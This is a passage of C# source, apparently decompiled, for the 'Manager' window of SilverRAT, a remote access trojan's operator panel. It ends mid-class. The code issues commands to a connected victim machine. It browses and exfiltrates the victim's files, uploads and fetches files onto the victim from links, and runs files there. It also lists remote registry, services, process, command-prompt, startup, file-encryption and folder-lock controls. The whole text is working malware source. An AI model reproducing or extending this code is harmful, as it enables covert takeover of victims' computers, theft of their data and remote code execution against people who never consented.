#define DEBUG
using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Server.Helper;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Manager : Form
{
    public object SyncLock = new object();

    private IContainer components = null;

    public System.Windows.Forms.Timer Timer1;

    private BunifuDragControl FormDragControl1;

    private BunifuElipse FormElipse;

    private Panel panelForm;

    private BunifuPanel PanelTitle;

    private BunifuLabel UserIdInfo;

    public BunifuLoader LoaderConnect;

    private BunifuLabel bunifuLabel7;

    private PictureBox ImageLogo;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuPages PageManager;

    private TabPage PageInfo;

    private TabPage PageInstall;

    private TabPage PageFileManager;

    private TabPage PageRegisrty;

    private TabPage PageServices;

    private TabPage PageConnect;

    private TabPage PageTaskManager;

    private TabPage PageCmd;

    private TabPage PageStartup;

    private TabPage PageDownload;

    private TabPage PageLogs;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelRight;

    private Panel PaneControll;

    private Guna2Button ButDownload;

    private Guna2Button ButCmd;

    private Guna2Button ButStartup;

    private Guna2Button ButTaskManager;

    private Guna2Button ButConnection;

    private Guna2Button ButLogs;

    private Guna2Button ButRegistry;

    private Guna2Button ButServices;

    private Guna2Button ButFiles;

    private Guna2Button ButInstalled;

    private Guna2Button ButInfo;

    private BunifuLabel TitlrPage;

    private Panel Panel2;

    private Panel Panel3;

    private Panel Panel4;

    private Panel Panel5;

    private Panel Panel6;

    private Panel Panel7;

    private Panel Panel8;

    private Panel Panel9;

    private Panel Panel10;

    private Panel Panel11;

    private Label label7;

    private Panel Panel1;

    public Guna2DataGridView ListInfo;

    public Guna2GradientButton GetInfo;

    public Bunifu.UI.WinForms.BunifuDropdown DownTypeInfo;

    private ContextMenuStrip ContexMuneInfo;

    private ToolStripMenuItem saveToolStripMenuItem;

    public BunifuLabel CountInfo;

    private ContextMenuStrip ContexMuneInstalled;

    private ToolStripMenuItem refreshToolStripMenuItem;

    private ToolStripMenuItem unistallToolStripMenuItem;

    public Guna2DataGridView ListInstalled;

    private DataGridViewImageColumn Column1;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

    private BunifuTextBox Search;

    private BunifuLabel SelectedItiemsL2;

    internal ImageList MG;

    public ImageList imageList1;

    private ContextMenuStrip CountexMuneFiles;

    private ToolStripMenuItem openToolStripMenuItem;

    private ToolStripMenuItem NormalToolStripMenuItem;

    private ToolStripMenuItem HidenToolStripMenuItem;

    private ToolStripMenuItem RunAsAdministratorToolStripMenuItem;

    private ToolStripMenuItem refreshToolStripMenuItem1;

    private ToolStripMenuItem AddArchiveToolStripMenuItem;

    private ToolStripMenuItem ExtractHereToolStripMenuItem;

    private ToolStripMenuItem FilesEncrypToolStripMenuItem;

    private ToolStripMenuItem EncryptToolStripMenuItem;

    private ToolStripMenuItem DecryptToolStripMenuItem;

    private ToolStripMenuItem FolderLockToolStripMenuItem;

    private ToolStripMenuItem LockToolStripMenuItem;

    private ToolStripMenuItem UnlockToolStripMenuItem;

    private ToolStripMenuItem DownloadToolStripMenuItem;

    private ToolStripMenuItem UploadFromLinkToolStripMenuItem;

    private ToolStripMenuItem UploadToolStripMenuItem;

    private ToolStripMenuItem RenameToolStripMenuItem;

    private ToolStripMenuItem EditorToolStripMenuItem;

    private ToolStripMenuItem CopyToolStripMenuItem;

    private ToolStripMenuItem CutToolStripMenuItem;

    private ToolStripMenuItem PasteToolStripMenuItem;

    private ToolStripMenuItem NewToolStripMenuItem;

    private ToolStripMenuItem FolderToolStripMenuItem;

    private ToolStripMenuItem EmptyFileToolStripMenuItem;

    private ToolStripMenuItem HideToolStripMenuItem;

    private ToolStripMenuItem ShowToolStripMenuItem;

    private ToolStripMenuItem DeleteToolStripMenuItem;

    private ToolStripMenuItem OpenDownloadFolderToolStripMenuItem;

    public BunifuTextBox TextBox1;

    public Bunifu.UI.WinForms.BunifuProgressBar pr;

    public BunifuLabel FolderLen;

    private ColumnHeader ColName;

    private ColumnHeader ColDate;

    private ColumnHeader ColType;

    private ColumnHeader ColSize;

    internal AeroListView AreListview2;

    internal AeroListView AeroListView1;

    private ColumnHeader columnHeader1;

    private ColumnHeader columnHeader2;

    public FlowLayoutPanel LayoutPanelDownload;

    private Panel PanelTitleFileManager;

    private Guna2Button ButtonPC;

    private Guna2Button SmailIcons;

    private Guna2Button TitleList;

    private Panel PanelListFileManager;

    private BunifuLabel LabelPageDownload;

    private TableLayoutPanel tableLayoutPanel;

    private SplitContainer splitContainer;

    public RegistryTreeView tvRegistryDirectory;

    private AeroListView lstRegistryValues;

    private ColumnHeader hName;

    private ColumnHeader hType;

    private ColumnHeader hValue;

    private MenuStrip menuStrip;

    private ToolStripMenuItem editToolStripMenuItem;

    private ToolStripMenuItem modifyToolStripMenuItem1;

    private ToolStripMenuItem modifyBinaryDataToolStripMenuItem1;

    private ToolStripSeparator modifyNewtoolStripSeparator;

    private ToolStripMenuItem newToolStripMenuItem2;

    private ToolStripMenuItem keyToolStripMenuItem2;

    private ToolStripSeparator toolStripSeparator7;

    private ToolStripMenuItem stringValueToolStripMenuItem2;

    private ToolStripMenuItem binaryValueToolStripMenuItem2;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem2;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem2;

    private ToolStripMenuItem multiStringValueToolStripMenuItem2;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem2;

    private ToolStripSeparator toolStripSeparator6;

    private ToolStripMenuItem deleteToolStripMenuItem2;

    private ToolStripMenuItem renameToolStripMenuItem2;

    private ContextMenuStrip selectedItem_ContextMenuStrip;

    private ToolStripMenuItem modifyToolStripMenuItem;

    private ToolStripMenuItem modifyBinaryDataToolStripMenuItem;

    private ToolStripSeparator modifyToolStripSeparator1;

    private ToolStripMenuItem deleteToolStripMenuItem1;

    private ToolStripMenuItem renameToolStripMenuItem1;

    private ContextMenuStrip lst_ContextMenuStrip;

    private ToolStripMenuItem newToolStripMenuItem1;

    private ToolStripMenuItem keyToolStripMenuItem1;

    private ToolStripSeparator toolStripSeparator4;

    private ToolStripMenuItem stringValueToolStripMenuItem1;

    private ToolStripMenuItem binaryValueToolStripMenuItem1;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem1;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem1;

    private ToolStripMenuItem multiStringValueToolStripMenuItem1;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem1;

    private ContextMenuStrip tv_ContextMenuStrip;

    private ToolStripMenuItem toolStripMenuItem1;

    private ToolStripMenuItem keyToolStripMenuItem;

    private ToolStripSeparator toolStripSeparator2;

    private ToolStripMenuItem stringValueToolStripMenuItem;

    private ToolStripMenuItem binaryValueToolStripMenuItem;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem;

    private ToolStripMenuItem multiStringValueToolStripMenuItem;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem;

    private ToolStripSeparator toolStripSeparator1;

    private ToolStripMenuItem toolStripMenuItem2;

    private ToolStripMenuItem toolStripMenuItem3;

    private ImageList imageRegistryDirectoryList;

    private ImageList imageRegistryKeyTypeList;

    private BunifuTextBox LogsRegistry;

    public Guna2DataGridView ListServices;

    private ContextMenuStrip ContexServices;

    private ToolStripMenuItem StartToolStripMenuItem;

    private ToolStripMenuItem RefreshToolStripMenuItem2;

    private ToolStripMenuItem StopToolStripMenuItem;

    public ImageList ImageListServices;

    public Guna2DataGridView ListConnection;

    private ContextMenuStrip ContexServices_1;

    private ToolStripMenuItem toolStripMenuItem_0;

    private ToolStripMenuItem KillConnect;

    internal ImageList imageList_0;

    public Guna2DataGridView ListProcess;

    private ContextMenuStrip contextTaskManager;

    private ToolStripMenuItem RefreshTaskManager;

    private ToolStripMenuItem RestartProcess;

    private ToolStripMenuItem KillProcess;

    private BunifuTextBox CommandCmd;

    public RichTextBox BoxCmd;

    public Guna2GradientButton PowerCommand;

    public Bunifu.UI.WinForms.BunifuDropdown CommandType;

    private Label label1;

    internal AeroListView ListStartup;

    private ColumnHeader NameStartup;

    private ColumnHeader TypeStartup;

    internal ImageList ImageListStartup;

    private ContextMenuStrip ContexListStartup;

    private ToolStripMenuItem RefreshListStartup;

    private ToolStripMenuItem DeleteKeyStartup;

    private PictureBox pictureBox1;

    public Guna2GradientButton PowerPerformance;

    private BunifuLabel bunifuLabel4;

    private BunifuPanel bunifuPanel2;

    private Guna2GradientButton guna2GradientButton_0;

    private Label label9;

    private BunifuPanel bunifuPanel1;

    private Guna2GradientButton guna2GradientButton_1;

    private Label label8;

    private BunifuPanel bunifuPanel11;

    private Guna2GradientButton guna2GradientButton_2;

    private Label label6;

    public BunifuLabel CPU;

    public BunifuLabel RAM;

    public BunifuLabel TimeSystem;

    public BunifuLabel bunifuLabel_0;

    private DataGridViewTextBoxColumn Column2;

    private DataGridViewTextBoxColumn Column3;

    private DataGridViewImageColumn dataGridViewImageColumn1;

    private DataGridViewTextBoxColumn Column6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

    private DataGridViewTextBoxColumn Column4;

    private DataGridViewTextBoxColumn Column5;

    private DataGridViewImageColumn dataGridViewImageColumn3;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn5;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn7;

    private DataGridViewTextBoxColumn Column7;

    private DataGridViewImageColumn dataGridViewImageColumn4;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn9;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn10;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn11;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public string DownloadPath { get; set; }

    public bool IsDownloadOrUpload { get; set; }

    public bool Admin { get; set; }

    public Manager()
    {
        InitializeComponent();
        MinimumSize = base.Size;
        DownTypeInfo.SelectedIndex = 0;
        CommandType.SelectedIndex = 0;
        AreListview2.Visible = false;
        IsDownloadOrUpload = true;
        PageManager.SelectedIndex = 10;
    }

    private void Manager_Load(object sender, EventArgs e)
    {
        ListviewDoubleBuffer.EnableDataGridView(ListConnection);
        ListviewDoubleBuffer.EnableDataGridView(ListInfo);
        ListviewDoubleBuffer.EnableDataGridView(ListProcess);
        ListviewDoubleBuffer.EnableDataGridView(ListServices);
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            string[] array = userIDClient.Split('\\');
            DownloadPath = Path.Combine(Application.StartupPath, "Clients", "Downloads\\" + array[0] + "_" + array[1]);
            if (!Directory.Exists(DownloadPath))
            {
                Directory.CreateDirectory(DownloadPath);
                FullPath = DownloadPath;
            }
            else
            {
                FullPath = DownloadPath;
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void Manager_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButInfo_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 0;
        TitlrPage.Text = "Informations";
    }

    private void ButInstalled_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 1;
        TitlrPage.Text = "Installed Software's";
    }

    private void ButFiles_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 2;
        TitlrPage.Text = "Files";
    }

    private void ButRegistry_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 3;
        TitlrPage.Text = "Registry";
    }

    private void ButServices_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 4;
        TitlrPage.Text = "Services";
    }

    private void ButConnection_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 5;
        TitlrPage.Text = "Connection";
    }

    private void ButTaskManager_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 6;
        TitlrPage.Text = "Task Manager";
    }

    private void ButCmd_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 7;
        TitlrPage.Text = "Command Prompt";
    }

    private void ButStartup_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 8;
        TitlrPage.Text = "Startup";
    }

    private void ButDownload_Click(object sender, EventArgs e)
    {
        if (LayoutPanelDownload.Controls.Count == 0)
        {
            LabelPageDownload.Visible = true;
        }
        else if (LayoutPanelDownload.Controls.Count > 0)
        {
            LabelPageDownload.Visible = false;
        }
        PageManager.SelectedIndex = 9;
    }

    private void ButLogs_Click(object sender, EventArgs e)
    {
        PageManager.SelectedIndex = 10;
        TitlrPage.Text = "Performance";
    }

    private string GetType(int index)
    {
        return index switch
        {
            0 => "Win32_DiskDrive",
            1 => "Win32_OperatingSystem",
            2 => "Win32_Processor",
            3 => "Win32_ComputerSystem",
            4 => "Win32_StartupCommand",
            5 => "Win32_ProgramGroup",
            6 => "Win32_SystemDevices",
            _ => "Win32_OperatingSystem",
        };
    }

    private void GetInfo_Click(object sender, EventArgs e)
    {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "Info";
        msgPack.ForcePathObject("Type").AsString = GetType(DownTypeInfo.SelectedIndex);
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        GetInfo.Enabled = false;
        DownTypeInfo.Enabled = false;
    }

    private void saveToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (ListInfo.RowCount == 0)
        {
            return;
        }
        SaveFileDialog saveFileDialog = new SaveFileDialog
        {
            Filter = "TXT |*.txt",
            FileName = DownTypeInfo.Text + "_Information"
        };
        if (saveFileDialog.ShowDialog() != DialogResult.OK)
        {
            return;
        }
        using TextWriter textWriter = new StreamWriter(saveFileDialog.FileName);
        for (int i = 0; i < ListInfo.Rows.Count - 1; i++)
        {
            for (int j = 0; j < ListInfo.Columns.Count; j++)
            {
                textWriter.Write($"{ListInfo.Rows[i].Cells[j].Value}");
                if (j != ListInfo.Columns.Count - 1)
                {
                    textWriter.Write(" : ");
                }
            }
            textWriter.WriteLine();
        }
        textWriter.Close();
        Notifiecation.Show("Manager!", "Information document saved successfully\r\n", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
    }

    private string GetValueSelcted(DataGridView DGV)
    {
        string result = null;
        foreach (DataGridViewRow selectedRow in DGV.SelectedRows)
        {
            result = selectedRow.Cells[1].Value.ToString();
        }
        return result;
    }

    private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "Installed";
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
    }

    private void unistallToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void TextBox1_OnIconLeftClick(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            string text = TextBox1.Text;
            if (text.Length <= 3)
            {
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getDrivers";
                TextBox1.Text = "";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                text = text.Remove(text.LastIndexOfAny(new char[1] { '\\' }, text.LastIndexOf('\\')));
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = text + "\\";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Packet").AsString = "fileManager";
            msgPack2.ForcePathObject("Command").AsString = "getDrivers";
            TextBox1.Text = "";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            AreListview2.Visible = false;
            AeroListView1.Visible = true;
        }
    }

    private void TextBox1_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            if (TextBox1.Text != "")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "fileManager";
                msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void AreListview2_DoubleClick(object sender, EventArgs e)
    {
        if (AreListview2.SelectedItems.Count == 0)
        {
            return;
        }
        if (AreListview2.SelectedItems[0].ImageIndex != 0 && AreListview2.SelectedItems[0].ImageIndex != 1 && AreListview2.SelectedItems[0].ImageIndex != 2)
        {
            try
            {
                if (AreListview2.SelectedItems.Count == 0)
                {
                    return;
                }
                foreach (ListViewItem itm in AreListview2.SelectedItems)
                {
                    if (itm.ImageIndex != 0 && itm.ImageIndex != 1 && itm.ImageIndex != 2)
                    {
                        string dwid = Guid.NewGuid().ToString();
                        BeginInvoke((MethodInvoker)delegate
                        {
                            FormNote formNote = (FormNote)Application.OpenForms["Editor:" + dwid];
                            if (formNote == null)
                            {
                                formNote = new FormNote
                                {
                                    Name = "Editor:" + dwid,
                                    Text = "Editor",
                                    Info = UserIdInfo.Text,
                                    PathsFile = itm.ToolTipText,
                                    SizeFile = itm.SubItems[3].Text,
                                    TypeFile = itm.SubItems[2].Text,
                                    DateFile = itm.SubItems[1].Text,
                                    Client = Client
                                };
                                formNote.Show();
                                MsgPack msgPack2 = new MsgPack();
                                msgPack2.ForcePathObject("Packet").AsString = "fileManager";
                                msgPack2.ForcePathObject("Command").AsString = "Editor";
                                msgPack2.ForcePathObject("Refresh").AsString = TextBox1.Text;
                                msgPack2.ForcePathObject("File").AsString = itm.ToolTipText;
                                msgPack2.ForcePathObject("DWID").AsString = dwid;
                                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                            }
                        });
                    }
                }
                return;
            }
            catch
            {
                return;
            }
        }
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getPath";
        msgPack.ForcePathObject("Path").AsString = AreListview2.SelectedItems[0].ToolTipText;
        AreListview2.Enabled = false;
        pr.Value = 30;
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
    }

    private void AeroListView1_DoubleClick(object sender, EventArgs e)
    {
        if (AeroListView1.SelectedItems.Count != 0)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "getPath";
            msgPack.ForcePathObject("Path").AsString = AeroListView1.SelectedItems[0].ToolTipText;
            pr.Value = 30;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            AeroListView1.Visible = false;
            AreListview2.Visible = true;
        }
    }

    private void Search_TextChange(object sender, EventArgs e)
    {
        try
        {
            SearchTextInListView(Search.Text, AreListview2);
        }
        catch
        {
        }
    }

    public void SearchTextInListView(string text, ListView lstSource, int SubItemsN = 0)
    {
        ListView listView = new ListView();
        string text2 = "";
        ListViewItem item1 = null;
        if (text2 == "" == (text == ""))
        {
            return;
        }
        text2 = text;
        int Index;
        for (Index = 0; Index < lstSource.Items.Count; Index++)
        {
            lstSource.Invoke((MethodInvoker)delegate
            {
                item1 = lstSource.Items[Index];
            });
            if (!item1.SubItems[SubItemsN].Text.ToLower().Contains(text.ToLower()))
            {
                Index--;
                lstSource.Invoke((MethodInvoker)delegate
                {
                    lstSource.Items.Remove(item1);
                    lstSource.EndUpdate();
                });
                if (!listView.Items.Contains(item1))
                {
                    listView.Items.Add(item1);
                }
            }
        }
        ListViewItem cItem;
        for (int i = 0; i < listView.Items.Count; i++)
        {
            cItem = listView.Items[i];
            if (cItem.SubItems[SubItemsN].Text.ToLower().Contains(text.ToLower()))
            {
                i--;
                listView.Items.Remove(cItem);
                lstSource.Invoke((MethodInvoker)delegate
                {
                    lstSource.BeginUpdate();
                    lstSource.Items.Add(cItem);
                    lstSource.EndUpdate();
                });
            }
        }
    }

    private void Search_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar != '\b' || Search.Text.Length != 1)
        {
            return;
        }
        try
        {
            try
            {
                if (TextBox1.Text != "")
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getPath";
                    msgPack.ForcePathObject("Path").AsString = TextBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
                else
                {
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
        catch (Exception ex)
        {
            Debug.WriteLine(ex.Message);
        }
    }

    private void AreListview2_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
    {
        SelectedItiemsL2.Text = AreListview2.SelectedItems.Count + " items selected";
    }

    private void ButtonPC_Click(object sender, EventArgs e)
    {
        TextBox1.Text = string.Empty;
        AreListview2.Visible = false;
        AeroListView1.Visible = true;
    }

    private void TitleList_Click(object sender, EventArgs e)
    {
        AreListview2.View = View.Tile;
    }

    private void SmailIcons_Click(object sender, EventArgs e)
    {
        AreListview2.View = View.Details;
    }

    private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            if (TextBox1.Text != "")
            {
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = TextBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getDrivers";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void uploadFromLinkToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (string.IsNullOrEmpty(TextBox1.Text))
        {
            return;
        }
        string dwid = Guid.NewGuid().ToString();
        BeginInvoke((MethodInvoker)delegate
        {
            UploadFromLink uploadFromLink = (UploadFromLink)Application.OpenForms["UploadFromLink:" + dwid];
            if (uploadFromLink == null)
            {
                uploadFromLink = new UploadFromLink
                {
                    Name = "UploadFromLink:" + dwid,
                    Text = "UploadFromLink",
                    Info = UserIdInfo.Text,
                    HWID = dwid,
                    Client = Client
                };
                uploadFromLink.Show();
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "UploadFromLink";
                msgPack.ForcePathObject("Folder").AsString = TextBox1.Text + "\\";
                msgPack.ForcePathObject("DWID").AsString = dwid;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        });
    }

    private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (ScanDownloadManager())
            {
                MessageBox.Show(this, "Download Manager is busy right now. Please wait for the download to finish\r\n", "Manager Download!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                if (AreListview2.SelectedItems.Count != 1)
                {
                    return;
                }
                {
                    foreach (ListViewItem itm in AreListview2.SelectedItems)
                    {
                        if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2)
                        {
                            break;
                        }
                        lock (SyncLock)
                        {
                            string Filename = itm.ToolTipText;
                            string FileSave = FullPath + "\\" + new FileInfo(Filename).Name;
                            if (File.Exists(FileSave))
                            {
                                if (MessageBox.Show(this, "This file is already in the download folder. If you want to re-download it, press Yes\r\n", "Manager Downloads", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                                {
                                    break;
                                }
                                try
                                {
                                    File.Delete(FileSave);
                                }
                                catch
                                {
                                    break;
                                }
                            }
                            string HWIDFile = Guid.NewGuid().ToString() + new FileInfo(Filename).Name;
                            BeginInvoke((MethodInvoker)delegate
                            {
                                DownloadUserControl1 value = new DownloadUserControl1
                                {
                                    Name = "Download:" + HWIDFile,
                                    TitleFile = new FileInfo(Filename).Name,
                                    SaveFile = FileSave,
                                    Path_Files = Filename
                                };
                                LayoutPanelDownload.Controls.Add(value);
                                int num = LayoutPanelDownload.Controls.Count - 1;
                                MsgPack msgPack = new MsgPack();
                                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                                msgPack.ForcePathObject("Command").AsString = "ReadingDownload";
                                msgPack.ForcePathObject("File").AsString = itm.ToolTipText;
                                msgPack.ForcePathObject("DWID").AsString = HWIDFile;
                                msgPack.ForcePathObject("Index").AsString = num.ToString();
                                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                            });
                        }
                    }
                    return;
                }
            }
        }
        catch
        {
        }
    }

    private bool ScanUploadManager()
    {
        try
        {
            if (LayoutPanelDownload.Controls.Count == 0)
            {
                return false;
            }
            int num = 0;
            foreach (Control control in LayoutPanelDownload.Controls)
            {
                _ = control;
                num++;
                int index = num - 1;
                UploadUserControl1 uploadUserControl = (UploadUserControl1)LayoutPanelDownload.Controls[index];
                if (uploadUserControl.IsRunning)
                {
                    return true;
                }
            }
            return false;
        }
        catch
        {
            return false;
        }
    }

    private bool ScanDownloadManager()
    {
        try
        {
            if (LayoutPanelDownload.Controls.Count == 0)
            {
                return false;
            }
            int num = 0;
            foreach (Control control in LayoutPanelDownload.Controls)
            {
                _ = control;
                num++;
                int index = num - 1;
                DownloadUserControl1 downloadUserControl = (DownloadUserControl1)LayoutPanelDownload.Controls[index];
                if (downloadUserControl.IsRunning)
                {
                    return true;
                }
            }
            return false;
        }
        catch
        {
            return false;
        }
    }

    private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (ScanUploadManager())
        {
            MessageBox.Show(this, "Upload Manager is busy right now. Please wait for the Upload to finish\r\n", "Manager Upload!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            return;
        }
        string FolderPath = TextBox1.Text;
        if (FolderPath != null && !AreListview2.Visible)
        {
            return;
        }
        try
        {
            OpenFileDialog Dilog = new OpenFileDialog
            {
                Multiselect = false
            };
            Guid.NewGuid().ToString();
            if (Dilog.ShowDialog() == DialogResult.OK)
            {
                string HWIDFile = Guid.NewGuid().ToString() + new FileInfo(Dilog.FileName).Name;
                BeginInvoke((MethodInvoker)delegate
                {
                    UploadUserControl1 value = new UploadUserControl1
                    {
                        Name = "Upload:" + HWIDFile,
                        TitleFile = new FileInfo(Dilog.FileName).Name,
                        UploadFile = Dilog.FileName,
                        SourceFile = FolderPath + "\\" + new FileInfo(Dilog.FileName).Name,
                        PathFiles = new FileInfo(Dilog.FileName).Directory.FullName,
                        Client = Client
                    };
                    LayoutPanelDownload.Controls.Add(value);
                    int num = LayoutPanelDownload.Controls.Count - 1;
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "UploadReadying";
                    msgPack.ForcePathObject("UPID").AsString = HWIDFile;
                    msgPack.ForcePathObject("FileName").AsString = FolderPath + "\\" + new FileInfo(Dilog.FileName).Name;
                    msgPack.ForcePathObject("Index").AsString = num.ToString();
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                });
            }
        }
        catch
        {
        }
    }

    private void NormalToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (AreListview2.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in AreListview2.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "execute";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

